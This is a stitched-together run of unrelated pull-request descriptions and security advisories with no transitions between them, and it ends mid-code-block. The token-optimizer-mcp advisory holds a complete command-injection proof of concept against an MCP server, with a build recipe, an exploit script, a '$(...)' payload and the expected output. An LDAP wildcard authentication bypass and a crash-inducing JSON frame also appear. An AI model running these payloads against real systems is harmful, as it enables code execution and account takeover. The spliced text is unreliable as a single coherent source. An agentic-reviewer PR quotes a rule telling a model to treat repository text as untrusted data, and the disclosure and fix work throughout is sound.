PR #11 was merged before these two commits were pushed to the same branch, so they never made it into that PR. This is a fresh PR for just those two commits, diffed against current `main`.

## Summary
App-layer production-readiness items, worked through as a go-live checklist before moving to infra:

- **Error handling** — `error.tsx`/`global-error.tsx`/`not-found.tsx` didn't exist at all before this; a real bug in front of a real client showed Next.js's bare default screen.
- **Name collected at signup** — wired to `profiles.display_name` via the existing `handle_new_user_profile` trigger. Previously defaulted silently to the email's local part.
- **Duplicate-email signup handled explicitly** — matches Supabase's explicit "already registered" error, and separately the anti-enumeration case (confirmed existing user re-signing up returns success with an empty identities array, not an error) — the old generic "check your email" message was actively misleading in that second case.
- **Change password while logged in** — new `/dashboard/account` page, `supabase.auth.updateUser`, same call the reset-password flow already used.
- **Rate limiting on `forgot-password`** — in-memory sliding-window limiter, 3 requests/15min, keyed by submitted email. Flagged in-code for when it needs to become a shared store (horizontal scaling).
- `BACKLOG.md` updated to record all of the above.

## Testing
All five flows verified live against the real dev Supabase project (not just build-level): name → `display_name`, a fresh real signup, a duplicate-signup attempt against a real confirmed account, the error/not-found boundaries, and a full change-password round trip (changed and immediately reverted, so the e2e suite's stored credential stays valid). `tsc`, `eslint`, unit tests, and `next build` all pass.

## What changed

- fixes auth/profile loading so slow or failed profile fetches do not misroute users into onboarding
- hardens booking authorization, legal state transitions, cancellation windows, double-booking prevention, package-credit integrity, reviews, corporate RLS, and marketplace queries
- moves booking push delivery into an authenticated Edge Function so the phone never reads another user's push token
- hardens Stripe PaymentIntent creation with booking-scoped idempotency, payout-readiness checks, webhook write verification, and refund reconciliation
- makes corporate account + first-owner creation atomic
- disables prototype package “purchase” behavior that created unpaid credits pending secure server-side checkout
- makes account deletion truthful and secure: the server derives identity from the verified JWT, failures no longer sign users out or claim success, and completed deletion clears the local session
- adds native password recovery for PKCE and token-fragment links, password validation, and a dedicated reset screen
- removes the hardcoded shared-secret App Review bypass and retires its Edge Function; reviewers now use a dedicated least-privilege username/password stored only in App Store Connect
- follows current Supabase React Native session guidance with serialized auth operations and foreground-only refresh polling
- isolates EAS development, preview, and production environments and removes committed Supabase/Stripe values from build profiles and old release docs
- fixes native date/time picker clobbering, rejects past and out-of-hours requests, displays recurring trainer availability, rejects malformed/overlapping availability slots, and adds recoverable loading failures to scheduling screens
- aligns Expo SDK 54 patch versions and adds regression coverage for release configuration

## Root causes

Several flows crossed prototype trust boundaries: the client could write financial rows directly, booking RLS did not limit columns/transitions, triggers ran under restricted callers, private profile joins were used for public display data, review IDs targeted the wrong table, and notification delivery depended on reading another user's token. Account deletion also treated an Edge Function failure as a successful request, while App Review access relied on a shared secret embedded in the client. Preview builds inherited production service values from committed configuration. Scheduling forms trusted platform picker timestamps wholesale and never compared booking requests with published hours.

## User and release impact

Booking and payment state changes now have server-side integrity controls, account deletion reports the real outcome, forgotten-password recovery works in the native app, and review builds no longer expose an authentication bypass. Booking dates remain stable when changing the time, users see trainer hours, and invalid scheduling requests are stopped before submission. Preview and simulator builds are explicitly separated from production configuration. Production behavior is unchanged until the migration and Edge Functions are promoted through staging.

## Validation

- `npm run typecheck` — pass
- `npm run lint` — pass
- `npm test -- --runInBand` — 59/59 pass
- `npx expo-doctor` — 18/18 pass
- `git diff --check` — pass
- production migration/function execution was intentionally not performed from this branch

## Deployment gates

Do not merge/deploy directly to production. First identify and authenticate the actual TrainerHub Supabase project—the repository's referenced project is not visible through the currently connected account. Then review production schema drift and overlapping bookings, apply to staging, run RLS/advisor tests, and deploy the changed functions. The deployment must remove any existing `review-signin` function. Add `trainerhub://reset-password` to the Supabase Auth redirect allowlist and test recovery on a physical iPhone.

Populate all three EAS-managed environments before building. Development and preview must use a non-production Supabase project and Stripe test key. Verify Stripe webhook events and signed retries in test mode, exercise client/trainer booking and cancellation flows, and reconcile App Store Connect build history before uploading build 27.

## Summary

Implements the Phase 4A-approved read-security architecture: `workspaceId` on a `runs/{runId}` document is now a mandatory integrity precondition wherever the run is read, not an optional/flagged feature.

- **Layer A** (`lib/workspaces/runWorkspaceIntegrity.ts`): requester-independent primitive — `validateRunWorkspaceAssociation(userId, runData)`. True absence (`workspaceId` never written) → `legacy`, zero Firestore lookup. Present-in-any-form (`null`/`""`/whitespace/wrong-type/present-undefined) → validated, never legacy. Reuses Phase 1's `resolveWorkspaceContextForResource()` unmodified, adding the one cross-check Phase 1 never needed: `Workspace.ownerUserId === run.userId` and `run.workspaceId === personal-{run.userId}`.
- **Layer B** (existing owner/reviewer/admin authorization): completely unchanged, runs only after Layer A passes for a `valid`/`legacy` resource. An `invalid` classification denies unconditionally, before Layer B, for every requester including the run's own owner.
- **No read-enable flag.** A boolean "off = legacy fallback" switch was explicitly rejected in the Phase 4A correction pass — it's an integrity precondition, not a feature. Confirmed via grep: `WORKSPACE_AWARE_READS_ENABLED` appears nowhere.
- **List routes batch, never skip.** Owner-scoped lists (`panel-history`) validate once per request (every row shares one deterministic Workspace). Reviewer-scoped lists (`reviews` inbox) validate once per distinct owner via a request-scoped memoization cache (`runWorkspaceIntegrityBatch.ts`), resolved concurrently — never one skip, never N sequential round-trips.

### Routes covered
`GET /api/user/runs/[runId]`, `.../governance`, `.../review-history`, `POST .../decision`, `POST .../export`, `GET .../exports`, `GET .../exports/[exportId]`, `GET /api/user/panel-history`, `GET /api/user/reviews`, `GET /api/user/run-governance` (scoped to the `runs` collection case), `GET /api/admin/runs/[runId]` (scoped to `runs`).

### Known, disclosed exclusions (not silently gapped — flagged for independent review)
- **`/api/synthesize-panel`** — has a pre-existing, separate authorization bypass (an in-flight-cache branch returns cached synthesis with *zero* ownership check at all, not even the existing weak one) that predates this work and was already flagged out-of-scope in the Phase 4A audit. Wiring Layer A around routes that still have that hole open would be misleading; fixing the pre-existing bug is a separate decision.
- **`GET /api/admin/runs` (list)** — discloses per-row `question`/`userId` via a Firestore `.select()` projection but was left out of this PR's scope alongside synthesize-panel, for independent review to weigh in on before extending.

## Test plan
- [x] `npx tsc --noEmit` — clean
- [x] `npm run lint` — only pre-existing unrelated warnings
- [x] `npm run build` — succeeds
- [x] `npx jest --runInBand` ×2 — identical both runs: 252 suites / 4528 tests / 56 snapshots (4492 baseline + 36 net new Phase 4B tests, reconciles exactly with the last known Quality Gate count)
- [x] Targeted security suites (`lib/workspaces/`, all touched routes): 29 suites / 497 tests, all green
- [x] No `.only`/`.skip`/`fit`/`fdescribe` anywhere in the diff
- [x] Fresh production read-only sweep immediately before this PR: 194 total runs, 4 bound, 190 legacy, **0 invalid** — deployment gate would currently PASS
- [x] Acceptance test proven directly: valid reviewer assignment + corrupted Workspace-bound run → denied through detail, never reaches legacy fallback; true legacy run → zero Workspace lookup, byte-identical response to pre-Phase-4B behavior

## Intent Make the operator COMPLETE decoupled / out-of-band (app-push) 3-D Secure, not just detect it. Today the operator detects the 3DS challenge and waits, but for banks that authenticate the challenge OUT OF BAND (in a mobile banking app, decoupled 3DS) it never receives the completion, so the order never finalizes even though the bank authenticated successfully. Live reproduction (3x, 2026-08-14): Merchant KobeeJapan (store.kobeejapan.net), single-page Shopify checkout, DBS Mastercard (vaulted), rc.21 installed (has #516 checkout fix + 3DS detection). Operator fills card, submits, Stripe requires 3DS -> Stripe hosted challenge renders in a CardinalCommerce iframe (https://hooks.stripe.com/3d_secure_2/hosted?...payment_intent=pi_...&payment_intent_client_secret=...&publishable_key=pk_live_...&stripe_account=acct_...). DBS uses decoupled/app-push 3DS: bank pushes to mobile app, user approves in-app out of band, bank/ACS authenticates OOB. Bug: operator's in-browser challenge frame never receives that OOB completion -- operate_pay's three_ds_wait_seconds elapses and returns payment_3ds_required/needs_user (wall=3ds, resume=checkout). Checkout stays stuck on Cardinal frame + Processing, no order is created, authenticated-but-uncaptured PaymentIntent expires uncaptured. Verified the user approved the push immediately and it still never registered -- not a timing/latency problem, a missing completion path. Root cause (confirmed via code read, not just hypothesis): the operator's 3DS handling (apps/mcp/src/bot/browser.ts detectThreeDsChallenge/waitForThreeDsResolution; apps/mcp/src/bot/pay-operator.ts 3DS state machine) only detected/finalized the IN-FRAME challenge-render case (user completes inside the iframe) via DOM text/URL heuristics, never the DECOUPLED case where completion is signalled server-side (Stripe transitions the PaymentIntent out of requires_action after the ACS confirms OOB). It waited on an in-frame signal that never arrives for app-push banks. Fix implemented: during the 3DS wait, additionally poll the authoritative Stripe PaymentIntent status -- the client_secret + publishable_key are already present in the challenge_url, parsed with a new parseStripeChallengeParams helper (publishable key only, never the secret key -- the same public retrieve-with-client-secret call Stripe.js itself makes client-side). Chose PaymentIntent polling over polling Shopify's own checkout-completion internals because it's the same signal Stripe's SDK relies on, requires no per-merchant-theme reverse engineering, and needs no additional credentials. When the PaymentIntent status leaves requires_action to succeeded/processing/requires_capture (classifyStripePaymentIntentStatus), that's treated as OOB-authenticated: the checkout page is reloaded once so the merchant's own completion logic re-evaluates now-authoritative server state, then the EXISTING DOM-based success detection (unchanged, still covers the in-frame case) gets a bounded ~30s grace window to confirm real order completion. requires_payment_method/canceled PaymentIntent statuses are treated as a definitive failure. Fail-closed: if the grace window elapses without a genuine DOM completion signal, the code returns a new distinct outcome (authenticated_pending_order -> payment_3ds_authenticated_pending_order) with needs_user guidance instead of ever silently claiming merchant/amount success on an unconfirmed completion. The original in-frame 3DS path (existing DOM text/URL detection) is completely unchanged and additive only. Money-fence boundaries preserved: single-approval-per-purchase unchanged, one approval authorizes exactly one charge, no re-arm/duplicate/double-charge path added, card only ever opens inside operate_pay, SecretRef.stored:false unaffected, card never exposed to the model. #515 session-addressed payments and the #516 checkout fix + detection + fail-closed confirmation are preserved -- this change is additive to the existing 3DS wait, not a replacement. Tests added: apps/mcp/src/bot/__tests__/browser-payment.test.ts (Stripe challenge URL parsing incl. non-Stripe-host and missing-param refusal, PaymentIntent status classification table, OOB polling+reload+fail-closed-pending, OOB polling+reload+genuine-DOM-success, OOB polling+terminal-failure-status with no reload, and a guard that the ordinary in-frame path never polls Stripe or reloads when no challenge_url is present) and apps/mcp/src/bot/__tests__/pay-operator.test.ts (new payment_3ds_authenticated_pending_order status end to end, plus updated existing waitForThreeDsResolution call-signature assertions for the new challenge_url argument). All 70 mcp test files / 1288 tests pass; typecheck clean. The definitive proof is a LIVE retry against a real DBS app-push 3DS challenge, which will be run separately with the captain after merge -- state that in the PR body. Deliver as a PR to staging (not main). Do NOT bump the package version -- that is published separately. ## What Changed - Poll Stripe PaymentIntent status during Stripe-hosted 3DS waits, keep challenge execution active, and reload the checkout once after an observed out-of-band authentication transition so merchant completion logic can resume. - Preserve merchant DOM confirmation as the success gate; treat terminal Stripe failures as declines and return `payment_3ds_authenticated_pending_order` with manual-check warnings and repeat-payment blocking when no order is confirmed. - Add regression coverage and documentation for decoupled 3DS parsing, polling, reload, failure, and fail-closed paths. A live DBS app-push retry will be run separately with the captain after merge. ## Risk Assessment ⚠️ Medium: The source is fail-closed and intent-conformant, but this money-path change depends on live browser and issuer timing whose definitive DBS verification is explicitly deferred until after merge. ## Testing The supplied baseline was successful; focused browser/operator tests, an executable OOB status-transition simulation, a real Chrome launch-flag probe, and a real-browser foreground submission check all passed, while the explicitly planned live DBS app-push retry remains separate post-merge proof with the captain.

snapshot_payload.description:
### Summary

`token-optimizer-mcp` is vulnerable to OS command injection in the `smart_user` tool.

The `get-user-info` operation accepts a user-controlled `username` argument and later interpolates it into a shell command executed through `execAsync()`:

```ts
getent passwd "${username}" || grep "^${username}:" /etc/passwd
```

Although the value is wrapped in double quotes, POSIX shells still evaluate command substitution such as `$(...)` and backticks inside double quotes. As a result, an MCP client can provide a crafted username such as:

```text
$(id > /tmp/TOKEN_OPTIMIZER_SMART_USER_ID)
```

and execute arbitrary local commands with the privileges of the user running the MCP server.

This is a CWE-78 OS command injection issue.

Tested version:

```text
@ooples/token-optimizer-mcp v5.0.1
MCP serverInfo.name: token-optimizer-mcp
MCP serverInfo.version: 0.2.0
```

This issue is not related to the current `npm audit` dependency advisories. The vulnerability is in `token-optimizer-mcp`'s own tool implementation.

---

### Details

The vulnerable code path is in the `smart_user` implementation.

The `username` argument is eventually passed into a shell command similar to:

```ts
const { stdout: passwdOut } = await execAsync(
  `getent passwd "${username}" || grep "^${username}:" /etc/passwd`
);
```

The problem is that `username` is controlled by the MCP tool caller and is inserted into a command string executed by a shell.

Double quotes do not make this safe. In POSIX shells, command substitution is still evaluated inside double quotes:

```bash
"$(id > /tmp/TOKEN_OPTIMIZER_SMART_USER_ID)"
"`id`"
```

Therefore, a malicious `username` can execute arbitrary commands before `getent` or `grep` receives its arguments.

The affected MCP tool call is:

```text
tool: smart_user
operation: get-user-info
argument: username
```

Root cause:

```text
MCP-controlled username
→ interpolated into shell command string
→ executed through execAsync()
→ shell evaluates $(...) / backticks
→ arbitrary command execution
```

---

### PoC

The following PoC runs a harmless `id` command and writes the result to a temporary file under `/tmp`.

Prerequisites:

```text
Node.js installed
token-optimizer-mcp built from source
```

Build from source:

```bash
git clone https://github.com/ooples/token-optimizer-mcp.git
cd token-optimizer-mcp
npm install
npm run build
```

Run the PoC:

```bash
cd /path/to/token-optimizer-mcp

ENTRY=dist/server/index.js
ID_OUT="/tmp/TOKEN_OPTIMIZER_SMART_USER_ID_$(date +%s)_$$"
rm -f "$ID_OUT"

echo "[*] ENTRY=$ENTRY"
echo "[*] id output file: $ID_OUT"

python3 - "$ID_OUT" <<'PY' | timeout 20 node "$ENTRY" 2>&1 | tee /tmp/token_optimizer_smart_user_poc.log
import json
import sys

id_out = sys.argv[1]

# This value is inserted into:
# getent passwd "${username}" || grep "^${username}:" /etc/passwd
# Command substitution still executes inside double quotes.
evil_username = f'$(id > {id_out})'

messages = [
    {
        "jsonrpc": "2.0",
        "id": "init",
        "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {
                "name": "poc",
                "version": "0"
            }
        }
    },
    {
        "jsonrpc": "2.0",
        "method": "notifications/initialized",
        "params": {}
    },
    {
        "jsonrpc": "2.0",
        "id": "poc-smart-user",
        "method": "tools/call",
        "params": {
            "name": "smart_user",
            "arguments": {
                "operation": "get-user-info",
                "username": evil_username,
                "useCache": False
            }
        }
    }
]

for msg in messages:
    print(json.dumps(msg), flush=True)
PY

sleep 1

if [ -f "$ID_OUT" ]; then
  echo "[VULN CONFIRMED] smart_user command injection executed:"
  cat "$ID_OUT"
  ls -l "$ID_OUT"
else
  echo "[FAIL] smart_user id output file not created"
  tail -120 /tmp/token_optimizer_smart_user_poc.log
fi
```

Expected result:

```text
[VULN CONFIRMED] smart_user command injection executed:
uid=1001(<local-user>) gid=1001(<local-user>) groups=...
-rw-rw-r-- 1 <local-user> <local-user> ... /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...
```

In my test, the MCP response also showed that the payload reached the shell command:

```text
Command failed: getent passwd "$(id > /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...)" || grep "^$(id > /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...):" /etc/passwd
```

The file `/tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...` was created and contained the output of `id`, confirming command execution as the MCP server user.

A simpler marker-file variant also works:

```json
{
  "operation": "get-user-info",
  "username": "$(touch /tmp/TOKEN_OPTIMIZER_SMART_USER_PWNED)",
  "useCache": false
}
```

---

### Impact

This is an OS command injection vulnerability.

Any MCP client that can call the `smart_user` tool can execute arbitrary shell commands through the `username` argument of the `get-user-info` operation.

The commands execute with the privileges of the user running the `token-optimizer-mcp` server.

Confirmed impact:

```text
execution of `id` as the MCP server user
arbitrary file creation under /tmp through an injected command
```

snapshot_payload.description:
Pivotick contains a DOM-based cross-site scripting vulnerability in its generic UI element resolution and icon-rendering utilities.

The tryResolveHTMLElement function treated any resolved string as HTML markup by assigning it to a <template> element through innerHTML. Strings derived from untrusted graph properties or custom rendering callbacks could therefore introduce arbitrary HTML or SVG elements into the live document. The vulnerable function was used by multiple UI components, including headers, property panels, extra panels, and tooltips.

Additionally, createIcon inserted caller-supplied svgIcon markup into a template without sanitization. An application integrating Pivotick and deriving icon markup from untrusted data could therefore expose a second script-execution path.

An unauthenticated attacker able to provide a crafted graph, property value, rendering result, or SVG icon could execute JavaScript in another user's browser when the affected content is displayed or interacted with. Successful exploitation could allow the attacker to access information available to the victim, manipulate graph data or application state, and perform actions with the victim's privileges.

The patch changes string rendering to use textContent, requiring callers to explicitly return an Element when HTML rendering is intended. It also sanitizes SVG icon markup before inserting it into the DOM.

## Summary

- Protect all five server-controlled Realtime error fields (`message`, `code`, `param`, `type`, and `event_id`) with exception-safe string conversion in the stable and beta handwritten Realtime emitters.
- Preserve existing valid-error formatting, the original event/error metadata, documented asynchronous rejection for unhandled errors, and exceptions thrown by application error listeners.
- Add one dedicated handwritten regression suite covering the four public stable/beta × native/Node WebSocket clients.

## Security impact

A remote WebSocket peer that can deliver a valid JSON Realtime error frame can send a noncoercible error value, for example:

```json
{"type":"error","error":{"message":{"toString":null,"valueOf":null}}}
```

The existing formatter interpolates attacker-controlled values before invoking registered SDK error handlers. JavaScript coercion then throws `TypeError: Cannot convert object to primitive value`; Node WebSocket clients can consequently terminate through an uncaught exception even when an SDK `.on('error')` listener is registered. The same sink exists for all five error fields in both stable and beta clients. The impact is remotely triggerable client denial of service, not credential disclosure or authentication bypass.

The fix catches only conversion failures and substitutes `[unserializable error value]`. It does not serialize untrusted objects, change public APIs, swallow application listener exceptions, or modify transport/generated files.

## Verification

- Failure-first baseline on unchanged `main`: **32 failing / 20 passing** security cases, reproducing every field across all four public clients.

When fabric-ca is configured with an LDAP backend, the username from HTTP Basic authentication is included in an LDAP uid search filter without proper escaping. An unauthenticated attacker with network access to the CA enrollment endpoint could exploit this to perform LDAP injection before password validation, and potentially steer authentication attempts toward a victim account.

### Recommendation

- All users of fabric-ca with an LDAP backend should update to a fixed version.
- For users not using an LDAP backend, no action is required.

snapshot_payload.body:
A corporate login (Flask + `ldap3`) authenticates against an OpenLDAP directory by concatenating untrusted input straight into an LDAP search filter — `(&(uid=<user>)(userPassword=<password>))` — and treating "the search matched" as a valid login. Because an LDAP filter is structure (RFC 4515), a metacharacter in the input is read as syntax: sending `*` as the password turns the password check into the presence test `(userPassword=*)`, which matches `admin` and logs in without the password — an authentication bypass (A03 — Injection).

The fix escapes the RFC 4515 metacharacters (`escape_filter_chars`) on **both** `user` and `password` before the filter is built, so `*` becomes the literal `\2a` and the value is matched as data, never as filter structure. The only difference in `app.py` is that one escape (plus the import).

Multi-container, following the datastore mold of `nosql-injection-mongo`: a shared OpenLDAP directory (built image, LDIF seed baked in, **no host port** — internal network only) plus `vulnerable` (127.0.0.1:8028) and `fixed` (127.0.0.1:8128). `ldap3` is pure-Python, so no native `libldap`/toolchain is needed.

Same class, category, and ceiling (auth bypass) as `nosql-injection-mongo`, by a different engine and the *opposite* fix: there the injection was a type change and escaping was the wrong fix; here it is a metacharacter in a concatenated string and escaping is exactly the fix.

**Validation:** the app binds as a non-root service account (`cn=svc`) granted only `search` on `userPassword` via ACL — so the bypass is LDAP injection, not an over-privileged bind (an anonymous bind matches neither the honest baseline nor the payload). Real filter logged on both sides: vulnerable `(&(uid=admin)(userPassword=*))` → `200`/`admin`; fixed `(&(uid=admin)(userPassword=\2a))` → `401`. The honest string credential behaves identically on both sides; only the metacharacter payload separates them. `ldap3` rejects the classic paren-injection with `LDAPInvalidFilterError`, so the working vector is the wildcard in a value position. 14/14 spec checklist PASS. Burp-only walkthrough; bilingual docs (EN + PT-BR).

snapshot_payload.body:
## Problem

GeoLibre works when opened directly and inside the HyperPBI Playground, but Power BI Desktop can leave the embedded component stuck at `Waiting for the pinned GeoLibre runtime handshake.`

Power BI can host custom visuals inside a sandboxed browsing context whose nested frames use an opaque serialized origin (`MessageEvent.origin === "null"`). HyperPBI previously required every GeoLibre message to have the normal HTTPS origin, so it discarded the real `geolibre:ready` message even when it came from the exact GeoLibre iframe window.

## Fix

- support two pinned message transports: normal HTTPS origin and opaque sandbox origin
- accept the opaque transport only from the exact GeoLibre iframe `contentWindow`
- pin the transport only after the expected GeoLibre version successfully completes the handshake
- prevent later messages from switching between strict and opaque origin modes
- use `postMessage(..., "*")` only after the opaque transport has been positively established; normal browser/runtime traffic remains exact-origin
- preserve project load/state and baseline selection events in the Power BI sandbox
- handle versioned `selectionChanged` events directly so GeoLibre -> Power BI interaction remains available without the public embed client
- add a managed-runtime fallback for `highlightFeature`, preserving Power BI/HyperPBI -> GeoLibre external highlighting when the public `@geolibre/embed` client cannot address an opaque child
- keep the public enhanced client for normal browser origins and keep it optional
- bump the PBIVIZ version to `1.0.1.3` so Power BI Desktop does not reuse the previous cached visual package

## Security/stability

The change does **not** globally trust null origins. HyperPBI still requires the message to come from the exact iframe WindowProxy, validates the pinned GeoLibre version before opening the opaque transport, then locks that transport for the lifetime of the adapter. Unexpected HTTPS origins and origin-mode changes are rejected.

## Regression coverage

- normal HTTPS-origin behavior still rejects attacker/null-origin traffic
- Power BI-style opaque handshake loads the project and uses `*` only after validation
- project state and selection events round-trip over the opaque transport
- external feature highlights use the managed opaque embed-command fallback
- invalid null-origin versions cannot pin the transport
- existing enhanced API, slow-start, timeout, and terminal-runtime behavior remain covered

## Validation

GitHub Actions CI is green on head `aac96563`:

- `npm ci`
- `npm run typecheck`
- `npm run web:typecheck`
- `npm run web:build`
- `npm run web:sites:build`
- `npm test`
- `npm run lint`
- `npm run docs:check`
- `npm run package:core`
- `npm run package:maps`
- `npm run package:verify`

The Vercel preview is also green. Final acceptance still requires importing the newly versioned Maps PBIVIZ into Power BI Desktop because CI cannot reproduce Microsoft's Desktop custom-visual host exactly.

No GeoLibre version upgrade is included. The managed runtime remains pinned to GeoLibre 2.5.0; this PR only fixes the Power BI Desktop transport boundary.

snapshot_payload.body:
## Why

Same-pipeline reviewers correlate by construction — the 2026-07-31 mepro audit measured 62%/67% overlap between same-harness instances vs 83% uniqueness for a different-pipeline reviewer. Model swaps and per-entry personas (#98) move the needle at the margins; **context-construction diversity** is the real lever. This PR adds it: fuko's own agentic reviewer as the second `ReviewBackend` implementation — which also makes it the existence proof the `docs/design.md` governor ("do not build a second backend driver until a real one exists") was waiting for.

## What

**`sidecar/reviewer/`** — the reviewer, harness-agnostic by design:
- `checkout.py`: PR metadata + unified diff via the API; `pull/N/head` at depth 1 into a temp dir. Auth rides in `GIT_CONFIG_*` env (not argv, not the remote URL), scoped to the single fetch. No blob filter — a filtered clone would lazy-fetch during checkout without auth.
- `prompt.py`: the review strategy + JSON output contract. Findings must cite `evidence` (what was read beyond the hunk); repo content is declared **untrusted data** — instruction-like text must be ignored and reported as a security finding. Low-confidence findings are withheld, giving the model a pressure valve that isn't "report it anyway".
- `harness.py`: headless Claude Code (`claude -p`), tool surface pinned to `Read,Grep,Glob` — headless mode can't prompt, so everything else is denied by construction. Timeout maps to returncode 124 (throttle-class → pool failover). An OSS harness for non-Anthropic models later implements the same `run_review` signature.

**`sidecar/backends/agentic.py`** — the driver. Egress is inverted vs pr-agent: findings are **born as Review Signal v1** and posted as one PR review with markers (and the A/B visible label) attached at creation — no markdown scraping, no PATCH pass. `invoke()` runs + stashes; `normalize_output()` builds signals with the branch's true `role` and posts under the branch `token` (only egress receives them). A 422 on inline anchoring degrades to a body-only review; a failed post returns zero signals rather than phantoms. Agent subprocess env strips `GITHUB_TOKEN`/`GITHUB__USER_TOKEN`/`FUKO_GITHUB_*`.

**Docs**: `docs/agentic-reviewer.md` (architecture, security model, cost/pacing, trial-seat guidance), design.md governor updated, example config notes the new backend value.

## Deliberate limits (tracked, not accidental)

- `anthropic` preset only — clear `ValueError` otherwise; other families arrive with the OSS harness.
- Global `backend` scalar and backend-less receipts → #99 (mixing agentic + pr-agent entries in one fleet lands there).
- One tool (`review`); `improve`/`describe` ignored for this backend.
- Runner prerequisite: `claude` CLI installed; a missing binary is a clean per-branch failure, not a throttle.

## Tests

23 new tests: checkout steps + token hygiene, diff truncation at file boundaries, prompt sections, parse tolerance/rejection, harness invocation shape + timeout mapping, build_env (incl. #98 steering combination), stash/filter/cap, throttle classification, marker + visible-label posting, 422 retry, failed-post = no signals. fix(security): password policy no longer zeroed by a partial config block (G37/G36) (#1428)

* fix(security): password policy no longer zeroed by a partial config block (G37/G36)

G37 — security-relevant fields defaulting to their insecure Go zero value:

- internal/core/password_policy.go's Validate already guarded MinLength (a
  non-positive value fell back to the conservative default), but every OTHER
  PasswordPolicyConfig field (RequireUppercase/Lowercase/Digit/Special,
  RejectPersonalInfo, RejectCommonPasswords, HistoryCount) had no such
  fallback. A partial password_policy block naming just one rule (e.g. only
  reject_common_passwords) silently zeroed out every rule it didn't mention,
  collapsing a 16-char/all-classes/history-5 policy down to "16 chars,
  reject common passwords" with everything else off.
  PasswordPolicyConfig's affected fields are now pointers (*bool/*int), so
  "unset" is distinguishable from an explicit false/0, and a new Resolve
  method merges only the explicitly-set fields onto the caller's default —
  both server/main.go (the actual applied policy) and the settings.go
  auth-config summary endpoint (which was reporting the raw, unresolved
  config rather than the effective policy, unlike its own LoginLockoutSummary
  sibling) now go through it. Explicit `false`/`0` is still fully honored
  (a lab install can still genuinely relax a rule).
- internal/storage/remote/client.go's TLSVerify zero-value-is-insecure
  finding was already fixed at its one production construction site
  (internal/storage/storage/factory.go) via config.RemoteConfig's existing
  *bool + VerifyTLS() "secure by default" pattern — confirmed via grep, no
  change needed; this PR's PasswordPolicyConfig fix reuses that exact idiom.
- internal/cli/bundle/bundle.go's --installed-version-defaults-empty finding
  is also already mitigated: a persisted version marker at the extract
  destination is authoritative over the flag on every import after the
  first, so only a first-ever import (nothing to downgrade from) skips the
  check — confirmed via reading validateAndPrepareExtract/CheckUpgrade, no
  change needed.
- server.RequireTransportTLS / security.enable_file_permission_check
  already fail safe-by-design (loud warning, not a silent gap) but their
  Go-level defaults can't be flipped without breaking every deployment that
  hasn't set them (a startup-refusing change, not a config change) — instead
  made both explicit in the shipped templates (see G36 below) and added a
  startup WARNING when file-permission checking is off (previously silent).
- storage.Scope's 0-means-global sentinel is the foundational, load-bearing
  RBAC scope convention used throughout the authz subsystem — genuinely
  architectural (matches the finding's own fix_effort), deferred.

G36 — shipped reference configs with no "don't use in production" banner:
adds a prominent banner to configs/keyorix.yaml.tpl, configs/test.yaml, and
server/config/web-enabled.yaml, plus inline "DEV-ONLY DEFAULT" markers on
each insecure default (TLS off, rate limiting off, swagger/reflection on).
keyorix.yaml.tpl's session.absolute_ttl now defaults to its own
already-documented recommendation (12h) instead of unbounded; its
security.require_transport_tls is now explicit (false, with the tradeoff
spelled out) rather than silently absent. server/config/production.yaml
gets the same require_transport_tls explanation, kept false there too since
that file's own TLS-terminated-by-proxy architecture would otherwise be
broken by forcing it true.

New regression tests (internal/config/config_extra_test.go) cover the G37
detection_idea directly: an absent block keeps 100% of the caller's
defaults, a partial block (including one parsed from real YAML) overrides
only the field it names, and an explicit false is still honored.

Part of the adversarial-review remediation campaign (G37 + G36, Wave 5).

## Summary

A full security-hardening pass across the backend API, frontend, and AI endpoints. Six real, exploitable issues found and fixed:

- **Stored XSS (frontend)** — `escapeAttr()` only escaped `"`, giving effectively no protection in text-node `innerHTML` contexts (e.g. table cells). Replaced with a proper `escapeHtml()` and applied it to every user-controlled render site, including several that had no escaping at all. Verified with a live Playwright test confirming an injected `<script>` payload never executes.
- **Content-type confusion / stored XSS via file upload** — the server trusted and echoed back the client-declared multipart `Content-Type`. Combined with the review UI's `blob:`-iframe document preview, this let an HTML/JS file disguised as a PDF execute same-origin when previewed. Fixed by deriving content-type solely from a fixed extension→MIME allowlist server-side, never from client input.
- **Missing rate limiting** — login and signup had none (only forgot-password/reset/contact did); the AI assistant endpoint had none either, despite every call being billed Anthropic API spend. Added a shared `createRateLimiter` factory, applied per-IP to login/signup and per-org to the assistant endpoint (the real cost there is API spend, not request volume).
- **No upload size limit** — unbounded uploads were a disk-exhaustion DoS vector. Added a 20MB limit via multer with a clean `413` instead of a generic `500`.
- **CSV/Excel formula injection** — an exported cell starting with `=`, `+`, `-`, or `@` executes as a live formula in Excel/Sheets/LibreOffice, not as text. A malicious vendor name or filename could exploit this the moment a finance team member opens their own export. Fixed with the standard leading-apostrophe mitigation.
- **Missing standard security headers** — added `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, and conditional `Strict-Transport-Security`. Deliberately no CSP yet — the review UI is hand-rolled vanilla JS/HTML with inline styles and no nonce/hash build step, so a real CSP needs that infrastructure first; documented as a follow-up rather than skipped silently.

Also: upgraded `sqlite3` to clear a critical `node-tar` vulnerability in its install-time toolchain, and audited every `findByPk`/`findOne` across all routes for org-scoping (IDOR) — no issues found there.

## Test plan

- [x] Full test suite: 156/156 passing (up from 146 — 10 new tests covering each fix above)
- [x] New `uploadSecurity.test.js` (4 tests): spoofed content-type not trusted, oversized upload rejected with 413, legitimate upload still works, a disguised executable with a spoofed PDF content-type is still rejected
- [x] New `securityHeaders.test.js` (2 tests): headers present, HSTS correctly absent over plain HTTP
- [x] Rate-limit tests added to `auth.test.js` (login + signup) and `assistant.test.js`
- [x] CSV formula-injection test in `api.test.js` — verified it actually catches a regression by temporarily reverting the fix and confirming the test fails, then restoring it and confirming it passes
- [x] XSS fix verified live via Playwright (payload never executes, renders as inert text)
- [x] `npm audit`: down to 3 moderate (a `uuid` transitive dep via exceljs/sequelize with low real-world reachability — documented as a deliberate tradeoff rather than forcing a breaking `exceljs` downgrade)

snapshot_payload.body:
Closes #496.

A shared passphrase on a published document — the WordPress "password protected
post" / Squarespace lock-page analogue. Kiln's two adjacent mechanisms don't
cover it: audiences need sign-in **and** an admin-granted membership, and
preview tokens share *drafts*. The "client proposal behind a passphrase" case
had no answer.

```bash
# Headless
curl -s http://localhost:4000/api/content/page/proposal
